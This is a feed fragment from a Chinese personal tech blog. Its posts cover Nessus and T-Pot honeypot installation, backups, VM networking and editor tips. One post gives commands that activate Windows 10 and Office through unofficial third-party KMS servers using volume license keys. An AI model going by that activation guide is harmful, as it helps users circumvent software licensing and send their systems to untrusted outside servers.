    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>只是简单的安装而已…</p><a id="more"></a><h1 id="01-下载Nessus安装包到服务器"><a href="#01-下载Nessus安装包到服务器" class="headerlink" title="01 下载Nessus安装包到服务器"></a>01 下载Nessus安装包到服务器</h1><p><a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">官网下载地址</a></p><p>方法一：下载到本地通过rz命令上传上去</p><p>方法二：暂无更好的wget或curl方式，以后补充</p><h1 id="02-安装Nessus"><a href="#02-安装Nessus" class="headerlink" title="02 安装Nessus"></a>02 安装Nessus</h1><p>下载好rpm包以后，通过  <code>rpm -ivh example.rpm</code>  进行安装</p><p><a href="http://os.51cto.com/art/201001/177866.htm" target="_blank" rel="noopener">参考链接</a></p><h1 id="03-开启服务及端口"><a href="#03-开启服务及端口" class="headerlink" title="03 开启服务及端口"></a>03 开启服务及端口</h1><p>开启服务：<code>service nessusd start</code></p><p>开启服务后可通过  <code>netstat -ntlp</code>  查看端口是否开启</p><p><img src="C:%5CUsers%5CElliot%5CPictures%5Cmd_temp%5C1554867515781.png" alt="1554867515781"></p><p>开启防火墙端口：<code>iptables -I INPUT -p tcp --dport 8834 -j ACCEPT</code></p><h1 id="04-完成"><a href="#04-完成" class="headerlink" title="04 完成"></a>04 完成</h1><p>访问本地的8834端口即可，登录账号密码为Nessus/Nessus</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;只是简单的安装而已…&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="CentOS" scheme="https://zzdkl.com.cn/categories/Linux/CentOS/"/>
    
      <category term="Software" scheme="https://zzdkl.com.cn/categories/Software/"/>
    
    
      <category term="Nessus" scheme="https://zzdkl.com.cn/tags/Nessus/"/>
    
  </entry>
  
  <entry>
    <title>关于bat的一些使用</title>
    <link href="https://zzdkl.com.cn/2019/08/28/bat_usage/"/>
    <id>https://zzdkl.com.cn/2019/08/28/bat_usage/</id>
    <published>2019-08-28T07:15:35.182Z</published>
    <updated>2019-08-28T07:16:42.784Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天我来写一下关于bat文件的一些使用，主要是方便使用快捷方式，不用打开文件夹来跳来跳去</p><a id="more"></a><h1 id="01-bat命令编写"><a href="#01-bat命令编写" class="headerlink" title="01. bat命令编写"></a>01. bat命令编写</h1><p>关于这部分网上有很多教程，眼花缭乱，懒得看了</p><p>关注的点有两个：一个是切换到工作目录，一个是直接执行命令就好了</p><h1 id="02-关于快捷方式"><a href="#02-关于快捷方式" class="headerlink" title="02. 关于快捷方式"></a>02. 关于快捷方式</h1><p>我个人有一点对美的追求，所以对bat文件进行了美化</p><p>首先只有快捷方式才能改图标。</p><p>其次就是图标了，推荐一个<a href="https://icon-icons.com/zh/" target="_blank" rel="noopener">搜索ico的网站</a></p><p>直接下载好替换即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天我来写一下关于bat文件的一些使用，主要是方便使用快捷方式，不用打开文件夹来跳来跳去&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Windows/"/>
    
      <category term="bat" scheme="https://zzdkl.com.cn/categories/Windows/bat/"/>
    
    
      <category term="bat" scheme="https://zzdkl.com.cn/tags/bat/"/>
    
  </entry>
  
  <entry>
    <title>今天我转向Firefox怀抱</title>
    <link href="https://zzdkl.com.cn/2019/08/27/about_firefox/"/>
    <id>https://zzdkl.com.cn/2019/08/27/about_firefox/</id>
    <published>2019-08-27T03:43:47.175Z</published>
    <updated>2019-08-29T02:44:40.638Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>Firefox虽然好用, 但还没有chrome好用, 可能是用习惯了.<br>通过一些调优就可以适合个性化使用  </p><a id="more"></a><h1 id="01-为什么要转向Firefox的怀抱？"><a href="#01-为什么要转向Firefox的怀抱？" class="headerlink" title="01 为什么要转向Firefox的怀抱？"></a>01 为什么要转向Firefox的怀抱？</h1><p>第一，Firefox插件有很多很方便</p><p>第二，Firefox内存占用比Chrome低一点</p><p>第三，没有文明 <em>$和谐字符$</em> 上网工具的话，同步账号会有点麻烦（虽然对于我来说不是个事）</p><p>第四，渗透测试用Firefox会更多一点</p><h1 id="02-注意事项"><a href="#02-注意事项" class="headerlink" title="02 注意事项"></a>02 注意事项</h1><p>第一，避免下载到天 <em>$和谐字符$</em> 朝特供版Firefox，检验方法：</p><p><code>打开菜单--帮助--关于</code></p><p>里面没有说什么中国xx科技的即可</p><h1 id="03-关于Flash"><a href="#03-关于Flash" class="headerlink" title="03 关于Flash"></a>03 关于Flash</h1><p>国内万恶的思杰马克丁…<br>烦<br>暂未有较好的解决办法…</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;Firefox虽然好用, 但还没有chrome好用, 可能是用习惯了.&lt;br&gt;通过一些调优就可以适合个性化使用  &lt;/p&gt;
    
    </summary>
    
      <category term="Browers" scheme="https://zzdkl.com.cn/categories/Browers/"/>
    
      <category term="Firefox" scheme="https://zzdkl.com.cn/categories/Browers/Firefox/"/>
    
    
      <category term="Firefox" scheme="https://zzdkl.com.cn/tags/Firefox/"/>
    
  </entry>
  
  <entry>
    <title>宇宙最强编辑器VS Code</title>
    <link href="https://zzdkl.com.cn/2019/08/23/the_best_vscode/"/>
    <id>https://zzdkl.com.cn/2019/08/23/the_best_vscode/</id>
    <published>2019-08-23T04:05:23.485Z</published>
    <updated>2019-08-29T02:42:32.547Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天推荐一个宇宙最强的编辑器：VS Code</p><a id="more"></a><p>VS Code是VS团队拆出来写的，和VS比，更轻量化</p><p>这个编辑器最好的优点是通过强大的各种插件，能编辑任何东西，这个chrome浏览器有点像</p><h1 id="01-功能"><a href="#01-功能" class="headerlink" title="01. 功能"></a>01. 功能</h1><p>那么这个编辑器常用的功能有哪些呢？<br>我常用的有这几个：git，python，markdown，其余后续进行补充</p><h1 id="02-介绍"><a href="#02-介绍" class="headerlink" title="02. 介绍"></a>02. 介绍</h1><ol><li>git：   git的使用我推荐查看这个文档 <a href="https://github.com/xuanhun/vscode/blob/master/Visual%20Studio%20Code%20%E4%BD%BF%E7%94%A8Git%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6.md" target="_blank" rel="noopener">参考链接</a>   参考其中的“提交保存”即可</li><li>python  装好python插件即可</li><li>markdown    md有两个插件，一个国人开发的 <strong>Markdown Preview Enhanced</strong>,一个是官方的 <strong>Markdown All in One</strong>, 两者差距有点大，因为我的是黑色调，所以我选择all in one，轻便，集成性好</li></ol><h1 id="03-快捷键"><a href="#03-快捷键" class="headerlink" title="03. 快捷键"></a>03. 快捷键</h1><p>对于快捷键，肯定是学多一点好啦。推荐这个 <img src="/upload_image/2019/04/vs-code-keyboard-shortcuts.jpg" alt="VS Code 快捷键大全中文版本"></p><p>也可以<a href="/upload_image/2019/04/vs-code-keyboard-shortcuts.jpg">点此下载</a></p><p>其余功能以后介绍</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天推荐一个宇宙最强的编辑器：VS Code&lt;/p&gt;
    
    </summary>
    
      <category term="VSCode" scheme="https://zzdkl.com.cn/categories/VSCode/"/>
    
    
      <category term="VSCode" scheme="https://zzdkl.com.cn/tags/VSCode/"/>
    
  </entry>
  
  <entry>
    <title>系统备份</title>
    <link href="https://zzdkl.com.cn/2019/08/22/system_backup/"/>
    <id>https://zzdkl.com.cn/2019/08/22/system_backup/</id>
    <published>2019-08-22T07:07:06.578Z</published>
    <updated>2019-08-22T07:12:13.931Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>最近对于系统备份有着需求，主要有以下几点场景：<br>系统重装<br>系统备份<br>系统还原<br>推荐使用AOMEI</p><a id="more"></a><h1 id="更新"><a href="#更新" class="headerlink" title="更新:"></a>更新:</h1><p>采用傲梅科技的<strong>轻松备份专业版</strong>即可, 非常方便<br><a href="https://www.aomeitech.com" target="_blank" rel="noopener">国际网站</a><br><a href="https://www.disktool.cn/" target="_blank" rel="noopener">CN网站</a></p><hr><h2 id="1-系统重装"><a href="#1-系统重装" class="headerlink" title="1.  系统重装"></a>1.  系统重装</h2><p>主要是更换硬件后的重装系统，需要对软件进行重新安装和调优</p><h2 id="2-系统备份"><a href="#2-系统备份" class="headerlink" title="2.   系统备份"></a>2.   系统备份</h2><p>希望能够将系统状态保持在最新版，并保存一个地方</p><h2 id="3-系统还原"><a href="#3-系统还原" class="headerlink" title="3.   系统还原"></a>3.   系统还原</h2><p>乐于折腾，弄好系统还原设置就可以大胆的搞了</p><h1 id="01-dism"><a href="#01-dism" class="headerlink" title="01 dism++"></a>01 dism++</h1><p>工具说明 ： 用来自定义优化windows系统，系统备份等，<br>常用的“系统优化”里的右键菜单管理和系统备份</p><p>任何有疑问的地方参考<a href="https://www.chuyu.me/zh-Hans/Document.html" target="_blank" rel="noopener">官方文档</a></p><h2 id="1-系统备份操作"><a href="#1-系统备份操作" class="headerlink" title="1. 系统备份操作"></a>1. 系统备份操作</h2><p>直接备份成esd文件即可，然后再转为ISO刻录文件也可以</p><p><a href="https://www.chuyu.me/zh-Hans/Document.html?file=Best/%E4%BD%BF%E7%94%A8Dism++%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F.md" target="_blank" rel="noopener">官方文档</a></p><p><a href="https://zhuanlan.zhihu.com/p/41743979" target="_blank" rel="noopener">iso、wim、esd文件的区别</a>  </p><p>注意 ： 压缩率越高，CPU要求越高<br><a href="https://bbs.xiaobanma.net/thread-115-1-1.html" target="_blank" rel="noopener">参考资料1</a>  </p><h2 id="2-系统还原操作"><a href="#2-系统还原操作" class="headerlink" title="2. 系统还原操作"></a>2. 系统还原操作</h2><p>待补充。。。</p><h2 id="3-增量备份操作"><a href="#3-增量备份操作" class="headerlink" title="3. 增量备份操作"></a>3. 增量备份操作</h2><p>对wim格式可以增量备份，<del>esd暂未测试</del>（更新：esd也支持增量备份）</p><ul><li>esd修改困难<br>esd适合iso发布用<br>不推荐一直改改改  </li></ul><hr><p>坑点 ： 设置白名单也会出现 “无法完成操作，因为文件包含病毒或潜在的垃圾软件”</p><p>这尼玛。。。</p><h1 id="2-系统还原"><a href="#2-系统还原" class="headerlink" title="2. 系统还原"></a>2. 系统还原</h1><p>使用dism++  （待测试）<br>进PE还原wim、esd文件  （待测试）<br>刻录成ISO引导盘 （待测试）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;最近对于系统备份有着需求，主要有以下几点场景：&lt;br&gt;系统重装&lt;br&gt;系统备份&lt;br&gt;系统还原&lt;br&gt;推荐使用AOMEI&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Windows/"/>
    
      <category term="BackUp" scheme="https://zzdkl.com.cn/categories/Windows/BackUp/"/>
    
      <category term="Software" scheme="https://zzdkl.com.cn/categories/Software/"/>
    
      <category term="AOMEI" scheme="https://zzdkl.com.cn/categories/Software/AOMEI/"/>
    
    
      <category term="BackUp" scheme="https://zzdkl.com.cn/tags/BackUp/"/>
    
  </entry>
  
  <entry>
    <title>巨硬Win10与Office激活</title>
    <link href="https://zzdkl.com.cn/2019/08/18/MS_activate/"/>
    <id>https://zzdkl.com.cn/2019/08/18/MS_activate/</id>
    <published>2019-08-18T02:21:08.194Z</published>
    <updated>2019-08-29T02:40:43.841Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>闲来无事，刚好遇到了激活类的问题，以及群里有人问到了，就写一下微软激活类的文章吧。</p><p>由于激活类存在时效性，因此不会对此文章进行更新，能用一天是一天，实在不行用报毒的KMS搞他一波</p><a id="more"></a><h1 id="01-激活Windows"><a href="#01-激活Windows" class="headerlink" title="01 激活Windows"></a>01 激活Windows</h1><p>Windows版本有几类，具体哪几类自己百度，我只推荐<code>专业版</code>和<code>企业长期支持版LTSB</code></p><p>Windows专业版激活步骤</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">slmgr<span class="selector-class">.vbs</span> /upk</span><br><span class="line"></span><br><span class="line">slmgr /ipk W269N-WFGWX-YVC9B-<span class="number">4</span>J6C9-T83GX</span><br><span class="line"></span><br><span class="line">slmgr /skms zh<span class="selector-class">.us</span><span class="selector-class">.to</span></span><br><span class="line"></span><br><span class="line">slmgr /ato</span><br></pre></td></tr></tbody></table></figure><p>用管理员权限打开的<code>CMD</code>或者<code>PowerShell</code>都可以</p><p>家庭版可用密钥 ： <code>PPBK3-M92CH-MRR9X-34Y9P-7CH2F</code></p><h1 id="02-激活office"><a href="#02-激活office" class="headerlink" title="02 激活office"></a>02 激活office</h1><p>office同样有很多版本，我只安装需要的<code>Word</code>,<code>Excel</code>,<code>PowerPoint</code>这三件套，在安装的时候选择自定义选项把其他的插件取消勾选就好，具体有机会再演示</p><p>激活步骤如下：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Program Files\Microsoft Office\Office16</span><br><span class="line">cscript ospp<span class="selector-class">.vbs</span> /inpkey:XQNVK-<span class="number">8</span>JYDB-WJ9W3-YJ8YR-WFG99</span><br><span class="line">cscript ospp<span class="selector-class">.vbs</span> /sethst:kms.<span class="number">03</span>k.org</span><br><span class="line">cscript ospp<span class="selector-class">.vbs</span> /act</span><br></pre></td></tr></tbody></table></figure><p>操作步骤同Windows激活，第一条命令是打开office安装目录，详细可参考<a href="https://www.hack520.com/ospp-vbs.html" target="_blank" rel="noopener">参考链接1 : ospp.vbs在哪里？</a></p><p>附上可能用得到的密钥 ：</p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Office Professional Plus <span class="number">2016</span>：XQNVK<span class="number">-8</span>JYDB-WJ9W3-YJ8YR-WFG99</span><br><span class="line"></span><br><span class="line">Office Standard <span class="number">2016</span>：JNRGM-WHDWX-FJJG3-K47QV-DRTFM</span><br><span class="line"></span><br><span class="line">Project Professional <span class="number">2016</span>：YG9NW<span class="number">-3</span>K39V<span class="number">-2</span>T3HJ<span class="number">-93</span>F3Q-G83KT</span><br><span class="line"></span><br><span class="line">Project Standard <span class="number">2016</span>：GNFHQ-F6YQM-KQDGJ<span class="number">-327</span>XX-KQBVC</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;闲来无事，刚好遇到了激活类的问题，以及群里有人问到了，就写一下微软激活类的文章吧。&lt;/p&gt;
&lt;p&gt;由于激活类存在时效性，因此不会对此文章进行更新，能用一天是一天，实在不行用报毒的KMS搞他一波&lt;/p&gt;
    
    </summary>
    
      <category term="Others" scheme="https://zzdkl.com.cn/categories/Others/"/>
    
    
      <category term="Microsoft" scheme="https://zzdkl.com.cn/tags/Microsoft/"/>
    
      <category term="Activate" scheme="https://zzdkl.com.cn/tags/Activate/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机上网相关</title>
    <link href="https://zzdkl.com.cn/2019/08/18/network_in_VM/"/>
    <id>https://zzdkl.com.cn/2019/08/18/network_in_VM/</id>
    <published>2019-08-18T02:21:08.191Z</published>
    <updated>2019-08-17T13:12:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天我要讲一下关于虚拟机上网的问题，NAT，桥接，让宿主机通过虚拟机上网。来吧，一起探究</p><a id="more"></a><h1 id="01-预备知识"><a href="#01-预备知识" class="headerlink" title="01. 预备知识"></a>01. 预备知识</h1><ol><li>首先参考这两个链接，很有用</li></ol><p><a href="https://blog.51cto.com/xpleaf/1900870" target="_blank" rel="noopener">NAT转换</a></p><p><a href="https://blog.51cto.com/xpleaf/1900870" target="_blank" rel="noopener">桥接模式</a></p><ol start="2"><li>之后就是设置IP的操作<ol><li>Windows下的<code>ipconfig/release SPECIFY_NETWORK_ADAPTER(etho0;WLAN)</code> 释放指定网卡，然后重设IP</li><li>Linux下设置IP地址<figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__ip地址配置__</span><br><span class="line">ifconfig   <span class="comment">//查看与配置网络状态命令</span></span><br><span class="line">ifconfig eth0 <span class="number">192.168</span><span class="number">.0</span><span class="number">.200</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>        <span class="comment">//临时设置eth0网卡的ip地址与子网掩码</span></span><br><span class="line">service network restart<span class="comment">//重启网络服务</span></span><br></pre></td></tr></tbody></table></figure></li></ol></li></ol><h1 id="02-宿主机通过虚拟机上网-桥接"><a href="#02-宿主机通过虚拟机上网-桥接" class="headerlink" title="02. 宿主机通过虚拟机上网(桥接)"></a>02. 宿主机通过虚拟机上网(桥接)</h1><p>通过参考链接的网络拓扑图我们可以清楚VMWare软件的网卡配置原理</p><p>首先，让虚拟机获得IP，测试能否上网</p><p>第二，释放掉宿主机IP，设置新IP，并设置虚拟机IP为网关地址</p><p>进行测试</p><h1 id="03-宿主机通过虚拟机上网-NAT"><a href="#03-宿主机通过虚拟机上网-NAT" class="headerlink" title="03. 宿主机通过虚拟机上网(NAT)"></a>03. 宿主机通过虚拟机上网(NAT)</h1><p>这个就是 <strong>难点</strong> 了.23333,其实如果能看懂网络拓扑图，问题也不难</p><p>最重要的点就是：如何通过VMnet8上网而不是宿主机的物理网卡，于此同时又不停用宿主机物理网卡(因为虚拟机出口网关要用)</p><p>这样就显得有点 <strong>没事找事干</strong> 了。</p><p>这里没有其他特别好的办法，也就VPN了</p><h1 id="04-总结"><a href="#04-总结" class="headerlink" title="04. 总结"></a>04. 总结</h1><p>没事瞎折腾找资料写着玩</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天我要讲一下关于虚拟机上网的问题，NAT，桥接，让宿主机通过虚拟机上网。来吧，一起探究&lt;/p&gt;
    
    </summary>
    
      <category term="Network" scheme="https://zzdkl.com.cn/categories/Network/"/>
    
    
      <category term="VM" scheme="https://zzdkl.com.cn/tags/VM/"/>
    
      <category term="Network" scheme="https://zzdkl.com.cn/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>tpot安装与介绍</title>
    <link href="https://zzdkl.com.cn/2019/08/18/tpot_installation/"/>
    <id>https://zzdkl.com.cn/2019/08/18/tpot_installation/</id>
    <published>2019-08-18T02:21:07.953Z</published>
    <updated>2019-08-29T02:40:55.572Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>某日接到一个任务, 搞定一个蜜罐: <a href="https://github.com/dtag-dev-sec/tpotce" target="_blank" rel="noopener">tpot</a><br>让我一个菜鸡来干这个, 心虚的很  </p><a id="more"></a><p>今日份的任务有两个:<br>第一个是如何搭建<br>第二个是简单使用办法</p><p>所有的问题解决最好办法就是参考官方文档.</p><h1 id="01-搭建前言"><a href="#01-搭建前言" class="headerlink" title="01 搭建前言"></a>01 搭建前言</h1><p><a href="https://github.com/dtag-dev-sec/tpotce#installation" target="_blank" rel="noopener">官方搭建文档-英</a><br><a href="https://www.youtube.com/watch?v=dWbJS_9sFNE&amp;feature=youtu.be" target="_blank" rel="noopener">官当搭建文档-视频-旧-16.0</a><br>这里提一句, 版本号是按照年份进行命令的, [官方博客]在这(<a href="http://dtag-dev-sec.github.io/" target="_blank" rel="noopener">http://dtag-dev-sec.github.io/</a>)  </p><p>安装方式有三种:</p><ol><li>ISO镜像安装</li><li>从Linux系统中直接安装</li><li>自己创建ISO镜像</li></ol><p>问题不大, 网络上基本都在推荐第二种方法, 因为说可以手动进行调整…个人认为太麻烦. 我认为第一种方法最合适, 因为不用系统啥balabala的弄, 省心. </p><p>闲话少说, 开干  </p><h1 id="02-搭建实操"><a href="#02-搭建实操" class="headerlink" title="02 搭建实操"></a>02 搭建实操</h1><p>安装条件: 稳定的DHCP网络<br>这里稳定就不说了, 下载的东西还挺大的, 具体就不知道了, 从33M的iso文件到8G多大的虚拟硬盘, 从防火墙看下载了2G左右的文件<br>DHCP, 我这里跳过了静态IP的配置, 可能这里会是一个坑点, 晚点再解决, 这里先占个位(官方文档要求DHCP)</p><p>下载官方ISO文件, <a href="https://github.com/dtag-dev-sec/tpotce/releases/download/19.03/tpot.iso" target="_blank" rel="noopener">19.03链接在这(github下载)</a></p><p>安装, 对硬件要求略高, 这里贴出配置要求:</p><ul><li>6-8 GB RAM (less RAM is possible but might introduce swapping)</li><li>128 GB SSD (smaller is possible but limits the capacity of storing events)</li><li>Network via DHCP</li><li>A working, non-proxied, internet connection</li></ul><p>贴一下我的配置<br><img src="/upload_image/2019/07/Snipaste_2019-07-22_14-36-20.png" alt=""></p><p>接下来就是毫无难度的安装了, 然后设置密码, 设置web端账号和密码, 两个<br><a href="https://www.freebuf.com/news/193347.html" target="_blank" rel="noopener">安装参考链接</a>, 里面还包含了一些介绍, 推荐阅读</p><p>我这边2M/s的小水管大概2个小时完成安装</p><p>安装好以后有两个界面: 1, web管理界面: 64297 和 2, 主机管理界面: 64294, 均用https访问</p><p>安装好后界面如下:<br>VM界面<img src="/upload_image/2019/07/Snipaste_2019-07-22_15-03-23.png" alt=""><br>web管理界面, 端口<code>64297</code>(填web账号密码)<img src="/upload_image/2019/07/Snipaste_2019-07-22_15-03-44.png" alt=""><br>主机管理界面, 端口<code>64294</code>(填主机账号密码)<img src="/upload_image/2019/07/Snipaste_2019-07-22_15-04-11.png" alt=""></p><h1 id="03-介绍"><a href="#03-介绍" class="headerlink" title="03 介绍"></a>03 介绍</h1><p>安装到此就告一段落, 接下来看一下这玩意怎么用  </p><ol><li>Dashboard<br>这里有很多现成可用的大版, 各种高大上, 分别对应各个蜜罐的视图  <img src="/upload_image/2019/07/Snipaste_2019-07-22_15-48-33.png" alt=""></li></ol><ul><li>adbhoney,</li><li>ciscoasa,</li><li>conpot,</li><li>cowrie,</li><li>dionaea,</li><li>elasticpot,</li><li>glastopf,</li><li>glutton,</li><li>heralding,</li><li>honeypy,</li><li>honeytrap,</li><li>mailoney,</li><li>medpot,</li><li>rdpy,</li><li>snare,</li><li>tanner</li></ul><p>上面各个蜜罐的介绍就看<a href="http://dtag-dev-sec.github.io/mediator/feature/2019/04/01/tpot-1903.html" target="_blank" rel="noopener">官方文档</a>吧</p><ol start="2"><li>实用工具<br>在界面上方会有5个工具  <img src="/upload_image/2019/07/Snipaste_2019-07-22_15-50-14.png" alt=""></li></ol><p>分别对应:<br>Furthermore we use the following tools</p><ul><li><strong>Cockpit</strong> for a lightweight, webui for docker, os, real-time performance monitoring and web terminal.</li><li><strong>Cyberchef</strong> a web app for encryption, encoding, compression and data analysis.</li><li><strong>ELK</strong> stack to beautifully visualize all the events captured by T-Pot.</li><li><strong>Elasticsearch</strong> Head a web front end for browsing and interacting with an Elastic Search cluster.</li><li><strong>Spiderfoot</strong> a open source intelligence automation tool.</li><li><strong>Suricata</strong> a Network Security Monitoring engine.</li></ul><ol start="3"><li><p>Discover界面<br>这个界面是用来过滤包, 所有的数据包都在这里, 然后可以经过左边的筛选出http包头, user-agent等数据, 时间戳等, 右上角就有很方便的设置<br><img src="/upload_image/2019/07/Snipaste_2019-07-22_16-25-35.png" alt=""></p></li><li><p>Visualize界面<br>那么这个界面用来干啥的呢.  是用来展示可视化界面的, 这里还可以新建一个自定义可视化视图, 例如饼状图, 柱状图等<br><img src="/upload_image/2019/07/Snipaste_2019-07-22_16-28-25.png" alt=""><br><img 